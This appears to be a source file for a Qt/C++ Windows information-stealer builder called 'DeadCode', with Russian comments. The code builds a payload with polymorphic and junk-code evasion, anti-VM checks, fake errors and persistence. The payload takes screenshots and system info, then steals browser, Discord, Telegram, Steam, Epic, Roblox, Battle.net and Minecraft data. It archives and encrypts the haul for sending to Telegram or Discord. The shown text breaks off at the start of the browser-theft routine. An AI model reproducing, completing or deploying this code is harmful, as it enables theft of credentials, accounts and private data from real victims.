#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"

#include <QMessageBox>
#include <QProcess>
#include <QFileDialog>
#include <QFile>
#include <QTextStream>
#include <QPropertyAnimation>
#include <QTimer>
#include <QDebug>
#include <QScreen>
#include <QPixmap>
#include <QJsonDocument>
#include <QJsonObject>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QHostInfo>
#include <QSettings>
#include <QDir>
#include <QRegularExpression>
#include <QGuiApplication>
#include <QThread>
#include <QSysInfo>
#include <QClipboard>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <windows.h>
#include <bcrypt.h>
#include <zip.h>
#include <sqlite3.h>
#include <curl/curl.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>

// Определение глобальной переменной
MainWindow* g_mainWindow = nullptr;

// Функция для получения данных от libcurl
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    s->append((char*)contents, newLength);
    return newLength;
}

// Реализация класса StealerWorker
class StealerWorker : public QObject {
    Q_OBJECT
public:
    StealerWorker(MainWindow* window, const std::string& tempDir) : window(window), tempDir(tempDir) {}

public slots:
    void process() {
        window->StealAndSendData(tempDir);
        emit finished();
    }

signals:
    void finished();

private:
    MainWindow* window;
    std::string tempDir;
};

// Удобный метод для вызова сигнала logUpdated
void MainWindow::emitLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    emit logUpdated(message);
}

// Конструктор
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , manager(new QNetworkAccessManager(this))
    , isBuilding(false)
    , buildTimer(new QTimer(this))
    , statusCheckTimer(new QTimer(this))
{
    ui->setupUi(this);
    g_mainWindow = this; // Инициализация глобальной переменной

    // Инициализация UI элементов
    tokenLineEdit = ui->tokenLineEdit;
    chatIdLineEdit = ui->chatIdLineEdit;
    discordWebhookLineEdit = ui->discordWebhookLineEdit;
    fileNameLineEdit = ui->filenameLineEdit;
    encryptionKey1LineEdit = ui->encryptionKey1LineEdit;
    encryptionKey2LineEdit = ui->encryptionKey2LineEdit;
    encryptionSaltLineEdit = ui->encryptionSaltLineEdit;
    iconPathLineEdit = ui->iconPathLineEdit;
    githubTokenLineEdit = ui->githubTokenLineEdit;
    githubRepoLineEdit = ui->githubRepoLineEdit;
    sendMethodComboBox = ui->sendMethodComboBox;
    buildMethodComboBox = ui->buildMethodComboBox;
    steamCheckBox = ui->steamCheckBox;
    steamMAFileCheckBox = ui->steamMAFileCheckBox;
    epicCheckBox = ui->epicCheckBox;
    robloxCheckBox = ui->robloxCheckBox;
    battlenetCheckBox = ui->battlenetCheckBox;
    minecraftCheckBox = ui->minecraftCheckBox;
    discordCheckBox = ui->discordCheckBox;
    telegramCheckBox = ui->telegramCheckBox;
    chatHistoryCheckBox = ui->chatHistoryCheckBox;
    cookiesCheckBox = ui->cookiesCheckBox;
    passwordsCheckBox = ui->passwordsCheckBox;
    screenshotCheckBox = ui->screenshotCheckBox;
    fileGrabberCheckBox = ui->fileGrabberCheckBox;
    systemInfoCheckBox = ui->systemInfoCheckBox;
    socialEngineeringCheckBox = ui->socialEngineeringCheckBox;
    antiVMCheckBox = ui->antiVMCheckBox;
    fakeErrorCheckBox = ui->fakeErrorCheckBox;
    silentCheckBox = ui->silentCheckBox;
    autoStartCheckBox = ui->autoStartCheckBox;
    persistCheckBox = ui->persistCheckBox;
    textEdit = ui->textEdit;
    iconBrowseButton = ui->iconBrowseButton;
    buildButton = ui->buildButton;
    actionSaveConfig = ui->actionSaveConfig;
    actionLoadConfig = ui->actionLoadConfig;
    actionExportLogs = ui->actionExportLogs;
    actionExit = ui->actionExit;
    actionAbout = ui->actionAbout;

    // Инициализация значений по умолчанию
    sendMethodComboBox->addItems({"Local File", "Telegram", "Discord"});
    buildMethodComboBox->addItems({"Local Build", "GitHub Actions"});
    fileNameLineEdit->setText("DeadCode.exe");
    textEdit->setPlaceholderText("Logs will appear here...");

    // Анимация для логотипа
    QPropertyAnimation *logoAnimation = new QPropertyAnimation(ui->logoLabel, "geometry", this);
    logoAnimation->setDuration(1500);
    logoAnimation->setStartValue(QRect(0, -150, 600, 150));
    logoAnimation->setEndValue(QRect(0, 0, 600, 150));
    logoAnimation->setEasingCurve(QEasingCurve::OutBounce);
    logoAnimation->start();

    // Анимация пульсации для кнопки "Собрать"
    QPropertyAnimation *buttonAnimation = new QPropertyAnimation(ui->buildButton, "size", this);
    buttonAnimation->setDuration(1000);
    buttonAnimation->setStartValue(QSize(100, 40));
    buttonAnimation->setKeyValueAt(0.5, QSize(120, 50));
    buttonAnimation->setEndValue(QSize(100, 40));
    buttonAnimation->setLoopCount(-1);
    buttonAnimation->setEasingCurve(QEasingCurve::InOutQuad);
    buttonAnimation->start();

    // Анимация появления секций
    animateSection(ui->gamingSectionLabel, ui->gamingSpacer);
    animateSection(ui->messengersSectionLabel, ui->messengersSpacer);
    animateSection(ui->browserSectionLabel, ui->browserSpacer);
    animateSection(ui->additionalSectionLabel, ui->additionalSpacer);
    animateSection(ui->stealthSectionLabel, ui->verticalSpacer);

    // Инициализация строки состояния
    ui->statusbar->showMessage("Готово", 0);

    // Подключение сигналов и слотов
    connect(ui->buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    connect(ui->iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    connect(ui->actionSaveConfig, &QAction::triggered, this, &MainWindow::on_actionSaveConfig_triggered);
    connect(ui->actionLoadConfig, &QAction::triggered, this, &MainWindow::on_actionLoadConfig_triggered);
    connect(ui->actionExportLogs, &QAction::triggered, this, &MainWindow::on_actionExportLogs_triggered);
    connect(ui->actionExit, &QAction::triggered, this, &MainWindow::on_actionExit_triggered);
    connect(ui->actionAbout, &QAction::triggered, this, &MainWindow::on_actionAbout_triggered);
    connect(manager, &QNetworkAccessManager::finished, this, &MainWindow::replyFinished);
    connect(ui->sendMethodComboBox, &QComboBox::currentTextChanged, this, [this](const QString& text) {
        ui->statusbar->showMessage("Метод отправки: " + text, 0);
    });
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
    connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
}

// Деструктор
MainWindow::~MainWindow() {
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
    g_mainWindow = nullptr;
}

// Анимация секций
void MainWindow::animateSection(QLabel* sectionLabel, QSpacerItem* spacer) {
    QWidget* parentWidget = sectionLabel->parentWidget();
    QVBoxLayout* layout = qobject_cast<QVBoxLayout*>(parentWidget->layout());
    if (!layout) return;

    QList<QWidget*> widgetsToAnimate;
    int startIndex = layout->indexOf(sectionLabel);
    int endIndex = spacer ? layout->indexOf(spacer) : layout->count();

    widgetsToAnimate.append(sectionLabel);
    for (int i = startIndex + 1; i < endIndex; ++i) {
        QLayoutItem* item = layout->itemAt(i);
        if (QWidget* widget = item->widget()) {
            if (dynamic_cast<QCheckBox*>(widget) || dynamic_cast<QComboBox*>(widget)) {
                widgetsToAnimate.append(widget);
            }
        }
    }

    for (QWidget* widget : widgetsToAnimate) {
        widget->setStyleSheet("opacity: 0;");
        widget->setMaximumHeight(0);
    }

    QParallelAnimationGroup* group = new QParallelAnimationGroup(this);
    for (QWidget* widget : widgetsToAnimate) {
        QPropertyAnimation* opacityAnimation = new QPropertyAnimation(widget, "windowOpacity");
        opacityAnimation->setDuration(500);
        opacityAnimation->setStartValue(0);
        opacityAnimation->setEndValue(1);
        opacityAnimation->setEasingCurve(QEasingCurve::OutCubic);

        QPropertyAnimation* heightAnimation = new QPropertyAnimation(widget, "maximumHeight");
        heightAnimation->setDuration(500);
        heightAnimation->setStartValue(0);
        heightAnimation->setEndValue(widget->sizeHint().height());
        heightAnimation->setEasingCurve(QEasingCurve::OutCubic);

        group->addAnimation(opacityAnimation);
        group->addAnimation(heightAnimation);
    }

    QTimer::singleShot(widgetsToAnimate.indexOf(sectionLabel) * 200, this, [group]() {
        group->start(QAbstractAnimation::DeleteWhenStopped);
    });
}

// Генерация случайной строки
std::string MainWindow::generateRandomString(size_t length) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::string result;
    result.reserve(length);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

    for (size_t i = 0; i < length; ++i) {
        result += alphanum[dis(gen)];
    }

    return result;
}

// Генерация уникального XOR-ключа
std::string MainWindow::generateUniqueXorKey() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::stringstream ss;
    for (int i = 0; i < 16; ++i) {
        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);
    }
    return ss.str();
}

// Получение ключа шифрования
std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::string keyStr = useFirstKey ? config.encryptionKey1 : config.encryptionKey2;
    if (keyStr.empty()) {
        keyStr = generateRandomString(16);
        if (useFirstKey) config.encryptionKey1 = keyStr;
        else config.encryptionKey2 = keyStr;
    }
    std::array<unsigned char, 16> key;
    if (keyStr.length() >= 16) {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i]);
        }
    } else {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);
        }
    }
    return key;
}

// Генерация IV
std::array<unsigned char, 16> MainWindow::generateIV() {
    std::array<unsigned char, 16> iv;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    for (auto& byte : iv) {
        byte = static_cast<unsigned char>(dis(gen));
    }
    return iv;
}

// Генерация полиморфного кода
void MainWindow::generatePolymorphicCode() {
    std::ofstream polyFile("polymorphic_code.h");
    if (!polyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать polymorphic_code.h. Проверьте права доступа.");
        isBuilding = false;
        return;
    }

    polyFile << "#ifndef POLYMORPHIC_CODE_H\n";
    polyFile << "#define POLYMORPHIC_CODE_H\n\n";
    polyFile << "#include <random>\n";
    polyFile << "#include <string>\n";
    polyFile << "#include <sstream>\n";
    polyFile << "#include <iomanip>\n";
    polyFile << "#include <chrono>\n";
    polyFile << "#include <thread>\n\n";
    polyFile << "// Этот файл перегенерируется динамически в mainwindow.cpp через generatePolymorphicCode()\n\n";

    // Генерация getRandomNumber
    polyFile << "inline int getRandomNumber(int min, int max) {\n";
    polyFile << "    static std::random_device rd;\n";
    polyFile << "    static std::mt19937 gen(rd());\n";
    polyFile << "    std::uniform_int_distribution<> dis(min, max);\n";
    polyFile << "    return dis(gen);\n";
    polyFile << "}\n\n";

    // Генерация generateRandomString
    polyFile << "inline std::string generateRandomString(size_t length) {\n";
    polyFile << "    static const char alphanum[] =\n";
    polyFile << "        \"0123456789\"\n";
    polyFile << "        \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n";
    polyFile << "        \"abcdefghijklmnopqrstuvwxyz\";\n";
    polyFile << "    std::string result;\n";
    polyFile << "    result.reserve(length);\n";
    polyFile << "    for (size_t i = 0; i < length; ++i) {\n";
    polyFile << "        result += alphanum[getRandomNumber(0, sizeof(alphanum) - 2)];\n";
    polyFile << "    }\n";
    polyFile << "    return result;\n";
    polyFile << "}\n\n";

    // Генерация generateRandomFuncName
    polyFile << "inline std::string generateRandomFuncName() {\n";
    polyFile << "    static const char* prefixes[] = {\"polyFunc\", \"obfFunc\", \"cryptFunc\", \"hideFunc\", \"maskFunc\"};\n";
    polyFile << "    std::stringstream ss;\n";
    polyFile << "    ss << prefixes[getRandomNumber(0, 4)] << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999) << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999);\n";
    polyFile << "    return ss.str();\n";
    polyFile << "}\n\n";

    polyFile << "namespace Polymorphic {\n\n";

    // Генерация 5–10 полиморфных функций
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(5, 10);
    int funcCount = dis(gen);
    std::vector<std::string> funcNames;
    for (int i = 0; i < funcCount; ++i) {
        std::string funcName;
        do {
            std::stringstream ss;
            ss << "polyFunc_" << std::setw(5) << std::setfill('0') << dis(gen) << "_" << std::setw(5) << std::setfill('0') << dis(gen);
            funcName = ss.str();
        } while (std::find(funcNames.begin(), funcNames.end(), funcName) != funcNames.end());
        funcNames.push_back(funcName);
        polyFile << "    inline void " << funcName << "() {\n";
        polyFile << "        volatile int dummy_" << dis(gen) << "_" << dis(gen) << " = getRandomNumber(1000, 15000);\n";
        polyFile << "        std::string noise = generateRandomString(getRandomNumber(5, 20));\n";
        polyFile << "        volatile int dummy2_" << dis(gen) << "_" << dis(gen) << " = dummy_" << dis(gen) << "_" << dis(gen) << " ^ noise.length();\n";
        polyFile << "        for (int i = 0; i < getRandomNumber(3, 15); i++) {\n";
        polyFile << "            if (dummy2_" << dis(gen) << "_" << dis(gen) << " % 2 == 0) {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " << getRandomNumber(1, 3)) ^ noise[i % noise.length()];\n";
        polyFile << "            } else {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " >> getRandomNumber(1, 2)) + getRandomNumber(10, 50);\n";
        polyFile << "            }\n";
        polyFile << "        }\n";
        polyFile << "        std::this_thread::sleep_for(std::chrono::milliseconds(getRandomNumber(1, 10)));\n";
        polyFile << "    }\n\n";
    }

    // Генерация executePolymorphicCode
    polyFile << "    inline void executePolymorphicCode() {\n";
    for (const auto& funcName : funcNames) {
        polyFile << "        " << funcName << "();\n";
    }
    polyFile << "    }\n\n";

    polyFile << "} // namespace Polymorphic\n\n";
    polyFile << "#endif // POLYMORPHIC_CODE_H\n";

    polyFile.close();
    emitLog("Полиморфный код сгенерирован в polymorphic_code.h");
}

// Генерация заголовочного файла ключей
void MainWindow::generateBuildKeyHeader() {
    std::ofstream keyFile("build_key.h");
    if (!keyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать build_key.h. Проверьте права доступа.");
        isBuilding = false;
        return;
    }

    keyFile << "#ifndef BUILD_KEY_H\n";
    keyFile << "#define BUILD_KEY_H\n\n";
    keyFile << "#include <array>\n";
    keyFile << "#include <string>\n";
    keyFile << "#include <sstream>\n";
    keyFile << "#include <iomanip>\n";
    keyFile << "#include <random>\n\n";
    keyFile << "// Этот файл генерируется автоматически в mainwindow.cpp через generateBuildKeyHeader()\n\n";

    // Определяем ключи и соль как константы
    keyFile << "const std::string ENCRYPTION_KEY_1 = \"" << config.encryptionKey1 << "\";\n";
    keyFile << "const std::string ENCRYPTION_KEY_2 = \"" << config.encryptionKey2 << "\";\n";
    keyFile << "const std::string ENCRYPTION_SALT = \"" << config.encryptionSalt << "\";\n\n";

    keyFile << "inline std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& keyStr) {\n";
    keyFile << "    std::array<unsigned char, 16> key;\n";
    keyFile << "    if (keyStr.length() >= 16) {\n";
    keyFile << "        for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "            key[i] = static_cast<unsigned char>(keyStr[i]);\n";
    keyFile << "        }\n";
    keyFile << "    } else {\n";
    keyFile << "        for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);\n";
    keyFile << "        }\n";
    keyFile << "    }\n";
    keyFile << "    return key;\n";
    keyFile << "}\n\n";

    keyFile << "inline std::array<unsigned char, 16> GenerateIV() {\n";
    keyFile << "    std::array<unsigned char, 16> iv;\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    for (auto& byte : iv) {\n";
    keyFile << "        byte = static_cast<unsigned char>(dis(gen));\n";
    keyFile << "    }\n";
    keyFile << "    return iv;\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateUniqueXorKey() {\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 16; ++i) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateRandomSalt() {\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 8; ++i) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "#endif // BUILD_KEY_H\n";

    keyFile.close();
    emitLog("Файл ключей шифрования сгенерирован в build_key.h");
}

// Копирование иконки
void MainWindow::copyIconToBuild() {
    QString iconPath = ui->iconPathLineEdit->text();
    if (!iconPath.isEmpty()) {
        try {
            std::filesystem::copy_file(iconPath.toStdString(), "icon.ico", std::filesystem::copy_options::overwrite_existing);
            emitLog("Иконка скопирована в директорию сборки: icon.ico");
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования иконки: " + QString::fromStdString(e.what()));
            isBuilding = false;
        }
    } else {
        emitLog("Иконка не указана, пропускаем копирование");
    }
}

// Сборка исполняемого файла
void MainWindow::buildExecutable() {
    if (isBuilding) return;
    isBuilding = true;
    buildTimer->stop();
    ui->statusbar->showMessage("Сборка началась...", 0);

    // Выполнение мусорного кода
    JunkCode::executeJunkCode();
    emitLog("Выполнен мусорный код перед началом сборки");

    std::string buildDir = std::string(std::getenv("TEMP")) + "\\DeadCode_Build_" + std::to_string(GetTickCount());
    QDir().mkpath(QString::fromStdString(buildDir));
    emitLog("Создана директория для сборки: " + QString::fromStdString(buildDir));

    try {
        std::filesystem::create_directories(buildDir + "\\src");
        for (const auto& entry : std::filesystem::directory_iterator(".")) {
            if (entry.path().filename() == "mainwindow.h" ||
                entry.path().filename() == "mainwindow.cpp" ||
                entry.path().filename() == "main.cpp" ||
                entry.path().filename() == "mainwindow.ui" ||
                entry.path().filename() == "polymorphic_code.h" ||
                entry.path().filename() == "build_key.h" ||
                entry.path().filename() == "junk_code.h") {
                std::filesystem::copy_file(entry.path(), buildDir + "\\src\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
            }
        }
        if (!ui->iconPathLineEdit->text().isEmpty()) {
            std::filesystem::copy_file(ui->iconPathLineEdit->text().toStdString(), buildDir + "\\icon.ico", std::filesystem::copy_options::overwrite_existing);
        }
        emitLog("Исходные файлы скопированы в " + QString::fromStdString(buildDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования исходных файлов: " + QString::fromStdString(e.what()));
        isBuilding = false;
        return;
    }

    std::ofstream proFile(buildDir + "\\stealer.pro");
    if (proFile.is_open()) {
        proFile << "QT += core gui network\n";
        proFile << "greaterThan(QT_MAJOR_VERSION, 4): QT += widgets\n";
        proFile << "TARGET = " << config.filename.substr(0, config.filename.find(".exe")) << "\n";
        proFile << "TEMPLATE = app\n";
        proFile << "SOURCES += src/main.cpp src/mainwindow.cpp\n";
        proFile << "HEADERS += src/mainwindow.h src/polymorphic_code.h src/build_key.h src/junk_code.h\n";
        proFile << "FORMS += src/mainwindow.ui\n";
        if (!ui->iconPathLineEdit->text().isEmpty()) {
            proFile << "RC_ICONS = icon.ico\n";
        }
        proFile << "LIBS += -luser32 -lbcrypt -lsqlite3 -lzip -lcurl -liphlpapi -lshlwapi -lpsapi\n";
        proFile.close();
        emitLog("Сгенерирован файл проекта: stealer.pro");
    } else {
        emitLog("Ошибка: Не удалось создать stealer.pro");
        isBuilding = false;
        return;
    }

    QProcess process;
    process.setWorkingDirectory(QString::fromStdString(buildDir));

    QString qmakePath = QStandardPaths::findExecutable("qmake");
    QString makePath = QStandardPaths::findExecutable("mingw32-make");
    if (qmakePath.isEmpty() || makePath.isEmpty()) {
        QString qtDir = qgetenv("QT_DIR");
        if (!qtDir.isEmpty()) {
            qmakePath = qtDir + "/bin/qmake.exe";
            makePath = qtDir + "/../mingw/bin/mingw32-make.exe";
        } else {
            emitLog("Ошибка: qmake или mingw32-make не найдены. Убедитесь, что Qt и MinGW установлены и добавлены в PATH.");
            isBuilding = false;
            return;
        }
    }

    process.start(qmakePath, QStringList() << "stealer.pro");
    if (!process.waitForFinished() || process.exitCode() != 0) {
        emitLog("Ошибка выполнения qmake: " + process.readAllStandardError());
        isBuilding = false;
        return;
    }
    emitLog("qmake выполнен успешно");

    process.start(makePath);
    if (!process.waitForFinished() || process.exitCode() != 0) {
        emitLog("Ошибка выполнения mingw32-make: " + process.readAllStandardError());
        isBuilding = false;
        return;
    }
    emitLog("mingw32-make выполнен успешно");

    std::string exePath = buildDir + "\\release\\" + config.filename;
    std::string outputPath = QDir::currentPath().toStdString() + "\\" + config.filename;
    try {
        std::filesystem::copy_file(exePath, outputPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Готовый билд сохранен: " + QString::fromStdString(outputPath));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования билда: " + QString::fromStdString(e.what()));
        isBuilding = false;
        return;
    }

    try {
        std::filesystem::remove_all(buildDir);
        emitLog("Временная директория сборки удалена");
    } catch (const std::exception& e) {
        emitLog("Ошибка удаления временной директории: " + QString::fromStdString(e.what()));
    }

    isBuilding = false;
    ui->statusbar->showMessage("Сборка завершена", 0);
    emit startStealSignal();
}

// Запуск GitHub Actions
void MainWindow::triggerGitHubActions() {
    QString githubToken = ui->githubTokenLineEdit->text();
    QString githubRepo = ui->githubRepoLineEdit->text();
    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: GitHub Token или репозиторий не указаны");
        isBuilding = false;
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + githubRepo + "/actions/workflows/build.yml/dispatches"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setRawHeader("Authorization", "token " + githubToken.toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QJsonObject json;
    json["ref"] = "main";
    QByteArray data = QJsonDocument(json).toJson();

    QNetworkReply *reply = manager->post(request, data);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            emitLog("Сборка успешно запущена через GitHub Actions");
            QJsonObject response = QJsonDocument::fromJson(reply->readAll()).object();
            workflowRunId = response["id"].toString();
            if (workflowRunId.isEmpty()) {
                emitLog("Ошибка: Не удалось получить ID workflow");
                isBuilding = false;
            } else {
                statusCheckTimer->start(30000);
            }
        } else {
            emitLog("Ошибка запуска GitHub Actions: " + reply->errorString());
            isBuilding = false;
        }
        reply->deleteLater();
    });
}

// Проверка статуса сборки GitHub Actions
void MainWindow::checkBuildStatus() {
    if (workflowRunId.isEmpty()) {
        emitLog("Ошибка: ID workflow не установлен");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QString githubToken = ui->githubTokenLineEdit->text();
    QString githubRepo = ui->githubRepoLineEdit->text();
    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: GitHub Token или репозиторий не указаны");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + githubRepo + "/actions/runs/" + workflowRunId));
    request.setRawHeader("Authorization", "token " + githubToken.toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply *reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            QJsonObject json = QJsonDocument::fromJson(reply->readAll()).object();
            QString status = json["status"].toString();
            QString conclusion = json["conclusion"].toString();
            emitLog("Статус сборки GitHub Actions: " + status + " (Conclusion: " + conclusion + ")");
            if (status == "completed") {
                statusCheckTimer->stop();
                if (conclusion == "success") {
                    emitLog("Сборка успешно завершена через GitHub Actions");
                    emit startStealSignal();
                } else {
                    emitLog("Сборка завершилась с ошибкой");
                    isBuilding = false;
                }
            }
        } else {
            emitLog("Ошибка проверки статуса GitHub Actions: " + reply->errorString());
            statusCheckTimer->stop();
            isBuilding = false;
        }
        reply->deleteLater();
    });
}

// Запуск процесса кражи данных
void MainWindow::startStealProcess() {
    if (AntiAnalysis()) {
        emitLog("Обнаружена виртуальная машина или антивирус. Завершение работы.");
        FakeError();
        exitApp();
        return;
    }
    if (config.fakeError) FakeError();
    if (config.silent) Stealth();
    if (config.autoStart || config.persist) Persist();

    // Запуск кражи данных в отдельном потоке
    std::string tempDir = std::string(std::getenv("TEMP")) + "\\DeadCode_" + std::to_string(GetTickCount());
    QDir().mkpath(QString::fromStdString(tempDir));
    emitLog("Создана временная директория: " + QString::fromStdString(tempDir));

    QThread* thread = new QThread;
    StealerWorker* worker = new StealerWorker(this, tempDir);
    worker->moveToThread(thread);

    connect(thread, &QThread::started, worker, &StealerWorker::process);
    connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    thread->start();
}

// Основной метод кражи и отправки данных
void MainWindow::StealAndSendData(const std::string& tempDir) {
    emitLog("Начинается процесс кражи данных...");

    // Выполнение мусорного кода
    JunkCode::executeJunkCode();
    emitLog("Выполнен мусорный код перед началом кражи данных");

    // Выполнение полиморфного кода
    Polymorphic::executePolymorphicCode();
    emitLog("Выполнен полиморфный код перед началом кражи данных");

    if (config.screenshot) takeScreenshot(tempDir);
    if (config.systemInfo) collectSystemInfo(tempDir);
    if (config.cookies || config.passwords) stealBrowserData(tempDir);
    if (config.discord || config.chatHistory) stealDiscordData(tempDir);
    if (config.telegram || config.chatHistory) stealTelegramData(tempDir);
    if (config.steam || config.steamMAFile) stealSteamData(tempDir);
    if (config.epic) stealEpicData(tempDir);
    if (config.roblox) stealRobloxData(tempDir);
    if (config.battlenet) stealBattleNetData(tempDir);
    if (config.minecraft) stealMinecraftData(tempDir);
    if (config.fileGrabber) stealFiles(tempDir);
    if (config.socialEngineering) collectSocialEngineeringData(tempDir);

    std::string archivePath = tempDir + "\\stolen_data.zip";
    archiveData(tempDir, archivePath);

    std::string encryptedPath = tempDir + "\\stolen_data_encrypted.zip";
    encryptData(archivePath, encryptedPath);

    sendData(encryptedPath);

    try {
        std::filesystem::remove_all(tempDir);
        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка удаления временной директории: " + QString::fromStdString(e.what()));
    }

    emitLog("Процесс кражи данных завершен");
}

// Снятие скриншота
void MainWindow::takeScreenshot(const std::string& dir) {
    QScreen *screen = QGuiApplication::primaryScreen();
    if (screen) {
        QPixmap screenshot = screen->grabWindow(0);
        std::string path = dir + "\\screenshot_" + std::to_string(GetTickCount()) + ".png";
        if (screenshot.save(QString::fromStdString(path), "PNG")) {
            screenshotsPaths.push_back(path);
            emitLog("Скриншот сохранен: " + QString::fromStdString(path));
        } else {
            emitLog("Ошибка: Не удалось сохранить скриншот");
        }
    } else {
        emitLog("Ошибка: Не удалось сделать скриншот");
    }
}

// Сбор системной информации
void MainWindow::collectSystemInfo(const std::string& dir) {
    QString systemInfo = "System Information:\n";
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameW(computerName, &size)) {
        systemInfo += "Computer Name: " + QString::fromWCharArray(computerName) + "\n";
    }

    wchar_t userName[UNLEN + 1];
    size = sizeof(userName) / sizeof(userName[0]);
    if (GetUserNameW(userName, &size)) {
        systemInfo += "Username: " + QString::fromWCharArray(userName) + "\n";
    }

    systemInfo += "OS: " + QSysInfo::prettyProductName() + "\n";
    QHostInfo hostInfo = QHostInfo::fromName(QHostInfo::localHostName());
    if (!hostInfo.addresses().isEmpty()) {
        systemInfo += "IP: " + hostInfo.addresses().first().toString() + "\n";
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    systemInfo += "Processor Architecture: " + QString::number(si.wProcessorArchitecture) + "\n";
    systemInfo += "Number of Processors: " + QString::number(si.dwNumberOfProcessors) + "\n";

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        systemInfo += "Total Physical Memory: " + QString::number(memoryStatus.ullTotalPhys / (1024 * 1024)) + " MB\n";
    }

    std::string path = dir + "\\system_info.txt";
    QFile file(QString::fromStdString(path));
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << systemInfo;
        file.close();
        emitLog("Системная информация сохранена: " + QString::fromStdString(path));
    } else {
        emitLog("Ошибка: Не удалось сохранить системную информацию");
    }
}

// Кража данных браузеров
void MainWindow::stealBrowserData(const std::string& dir) {
    char appDataPath[MAX_PATH];
